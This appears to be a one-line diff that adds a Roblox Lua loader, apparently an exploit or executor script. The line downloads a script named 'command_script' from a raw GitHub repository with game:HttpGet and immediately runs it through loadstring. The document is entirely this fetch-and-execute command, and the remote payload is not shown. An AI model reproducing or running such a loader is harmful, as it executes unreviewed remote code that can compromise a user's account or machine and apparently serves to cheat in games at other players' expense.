@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Aidez/MiscGunTest_X/main/command_script'),true))()
